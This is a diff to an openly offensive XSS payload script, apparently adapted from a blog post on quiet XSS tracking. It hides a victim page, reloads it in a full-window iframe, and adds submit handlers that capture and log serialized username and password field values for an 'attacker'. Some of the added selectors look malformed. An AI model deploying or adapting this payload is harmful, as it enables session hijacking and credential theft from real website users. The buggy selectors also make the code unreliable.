@@ -1,3 +1,5 @@
+<! --- http://blog.kotowicz.net/2010/11/xss-track-how-to-quietly-track-whole.html --->
+
 <html>
 <meta charset="utf-8">
 <script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js">
@@ -13,8 +15,7 @@ function payload(attacker) {
   }
   
   $("html").hide();
-  
-  $('body').children().hide()
+
   $('<iframe>')
     .css({
   position: 'absolute',
@@ -28,6 +29,27 @@ function payload(attacker) {
   .attr('src', "html")
   .appendTo('body');
   proxy("./");
+  
+  $('body',this.contentDocument)
+  .find('username.form-control')
+  .submit(function() {
+    log({event: 'submit',
+       from: location,
+       action: $(this).attr('action') || location,
+       fields: $(this).serialize()
+       });
+  })
+  .end()
+  .find('userpass.form-control')
+  .submit(function() {
+    log({event: 'submit',
+       from: location,
+       action: $(this).attr('action') || location,
+       fields: $(this).serialize()
+       });
+  })
+  .end();
+  
 }
 
 function makeLink(xssdefense, target, attacker) {
